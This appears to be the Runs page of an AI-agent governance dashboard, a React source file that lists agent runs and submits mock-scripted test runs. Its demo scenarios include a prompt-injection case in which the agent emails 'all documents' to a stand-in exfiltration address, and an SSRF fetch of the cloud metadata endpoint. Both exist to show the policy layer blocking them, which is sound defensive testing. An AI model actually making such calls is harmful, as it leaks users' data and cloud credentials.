"use client";
// SPDX-License-Identifier: FSL-1.1-ALv2
// Copyright 2026 AegisTrace contributors
import { useRouter, useSearchParams } from "next/navigation";
import { Suspense, useMemo, useState } from "react";
import { api, timeAgo, toast, useLive } from "@/lib/client";
import type { Agent, Run } from "@/lib/types";
import { Badge, Drawer, Empty, LiveIndicator, PageHeader, Panel, Skeleton } from "@/components/ui";

const FILTERS = ["ALL", "RUNNING", "QUEUED", "WAITING_FOR_APPROVAL", "SUCCEEDED", "FAILED", "NEEDS_RECONCILIATION", "CANCELLED"];

const SCENARIOS: Record<string, { label: string; hint: string; script: unknown[] }> = {
  safe: {
    label: "Governed research", hint: "Allowed read, then a final answer",
    script: [{ tool: "calc.add", args: { a: 40, b: 2 } }, { final: "The answer is 42." }],
  },
  injection: {
    label: "Prompt injection", hint: "Agent tries to email data out; policy blocks it",
    script: [
      { tool: "calc.add", args: { a: 1, b: 1 } },
      { tool: "email.send", args: { to: "exfil@evil.example", subject: "data", body: "all documents" } },
      { final: "done" },
    ],
  },
  approval: {
    label: "Approval required", hint: "Consequential export pauses for a human",
    script: [{ tool: "data.export", args: { dataset: "customers", destination: "s3.partner", classification: "CONFIDENTIAL" } }, { final: "exported" }],
  },
  ssrf: {
    label: "SSRF attempt", hint: "Fetch to an un-allowlisted host",
    script: [{ tool: "http.fetch", args: { url: "https://169.254.169.254/latest/meta-data" } }, { final: "x" }],
  },
};

function NewRun({ onDone }: { onDone: (id: string) => void }) {
  const agents = useLive<{ items: Agent[] }>("v1/agents", 30000);
  const [agent, setAgent] = useState("");
  const [scenario, setScenario] = useState("safe");
  const [script, setScript] = useState(JSON.stringify(SCENARIOS.safe!.script, null, 2));
  const [task, setTask] = useState("Summarize the quarterly numbers");
  const [busy, setBusy] = useState(false);
  const agentId = agent || agents.data?.items[0]?.id || "";

  async function submit() {
    let parsed: unknown;
    try { parsed = JSON.parse(script); } catch { toast("Script is not valid JSON", "bad"); return; }
    setBusy(true);
    try {
      const r = await api<{ id: string }>("v1/runs", {
        method: "POST", json: { agent_id: agentId, input: { task, mock_script: parsed } },
        headers: { "Idempotency-Key": `dash-${crypto.randomUUID()}` },
      });
      toast("Run submitted", "ok");
      onDone(r.id);
    } catch (e) {
      toast(e instanceof Error ? e.message : "Submit failed", "bad");
    } finally { setBusy(false); }
  }

  return (
    <div className="flex flex-col gap-4">
      <label className="flex flex-col gap-1.5"><span className="text-[13px] muted">Agent</span>
        <select className="input" value={agentId} onChange={(e) => setAgent(e.target.value)}>
          {(agents.data?.items ?? []).map((a) => <option key={a.id} value={a.id}>{a.name} · {a.id.slice(0, 12)}…</option>)}
        </select>
      </label>
      <div className="flex flex-col gap-1.5"><span className="text-[13px] muted">Scenario (mock model script)</span>
        <div className="grid grid-cols-2 gap-2">
          {Object.entries(SCENARIOS).map(([k, v]) => (
            <button key={k} type="button" onClick={() => { setScenario(k); setScript(JSON.stringify(v.script, null, 2)); }}
                    className="rounded-lg border p-3 text-left transition-colors"
                    style={{ borderColor: scenario === k ? "#3a3f47" : "var(--border)", background: scenario === k ? "var(--hover)" : "transparent" }}>
              <div className="text-[13.5px] font-medium">{v.label}</div>
              <div className="mt-0.5 text-[12.5px] muted">{v.hint}</div>
            </button>
          ))}
        </div>
      </div>
      <label className="flex flex-col gap-1.5"><span className="text-[13px] muted">Task</span>
        <input className="input" value={task} onChange={(e) => setTask(e.target.value)} />
      </label>
      <label className="flex flex-col gap-1.5"><span className="text-[13px] muted">Model script</span>
        <textarea className="input mono text-[12.5px]" rows={10} value={script} onChange={(e) => setScript(e.target.value)} spellCheck={false} />
      </label>
      <p className="text-[12.5px] muted">Every tool call still goes through grants, OPA and approvals. The script only decides what the model proposes.</p>
      <button className="btn btn-green h-9 justify-center" disabled={busy || !agentId} onClick={submit}>{busy ? "Submitting…" : "Submit run"}</button>
    </div>
  );
}

function RunsInner() {
  const router = useRouter();
  const params = useSearchParams();
  const state = params.get("state") ?? "ALL";
  const [q, setQ] = useState(params.get("q") ?? "");
  const [open, setOpen] = useState(params.get("new") === "1");
  const live = useLive<{ items: Run[]; next_cursor: string | null }>(
    `v1/runs?limit=100${state !== "ALL" ? `&state=${state}` : ""}`, 2500);
  const rows = useMemo(() => (live.data?.items ?? []).filter((r) => !q || r.id.includes(q) || r.agent_id.includes(q)), [live.data, q]);

  return (
    <>
      <PageHeader title="Runs" subtitle="Each run is one task given to an agent. Click a run to see every step it took and why."
                  actions={<><LiveIndicator updatedAt={live.updatedAt} error={live.error} />
                    <button className="btn btn-green" onClick={() => setOpen(true)}>New run</button></>} />
      <div className="mb-3 flex flex-wrap items-center gap-2">
        {FILTERS.map((f) => (
          <button key={f} className="chip" data-active={state === f}
                  onClick={() => router.replace(f === "ALL" ? "/runs" : `/runs?state=${f}`)}>
            {f === "ALL" ? "All" : f === "WAITING_FOR_APPROVAL" ? "waiting on you" : f === "NEEDS_RECONCILIATION" ? "needs review" : f.toLowerCase()}
          </button>
        ))}
        <input className="input ml-auto w-full sm:w-64" placeholder="Search run or agent id" value={q} onChange={(e) => setQ(e.target.value)} />
      </div>
      <Panel>
        {!live.data ? <Skeleton rows={6} /> : rows.length === 0 ? <Empty>No matching runs.</Empty> : (
          <div className="overflow-x-auto">
            <table className="tbl">
              <thead><tr><th>Run</th><th>State</th><th>Agent</th><th className="text-right">Events</th>
                <th className="text-right">Attempt</th><th className="text-right">Updated</th></tr></thead>
              <tbody>
                {rows.map((r) => (
                  <tr key={r.id} className="cursor-pointer fade-in" onClick={() => router.push(`/runs/${r.id}`)}>
                    <td className="mono">{r.id}</td>
                    <td><Badge value={r.state} /></td>
                    <td className="mono muted">{r.agent_id.slice(0, 16)}…</td>
                    <td className="tnum text-right text-2">{r.last_sequence}</td>
                    <td className="tnum text-right muted">{r.attempt}</td>
                    <td className="text-right muted whitespace-nowrap">{timeAgo(r.updated_at)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </Panel>
      <Drawer open={open} onClose={() => setOpen(false)} title="New run">
        <NewRun onDone={(id) => { setOpen(false); router.push(`/runs/${id}`); }} />
      </Drawer>
    </>
  );
}

export default function Runs() {
  return <Suspense fallback={<Skeleton />}><RunsInner /></Suspense>;
}
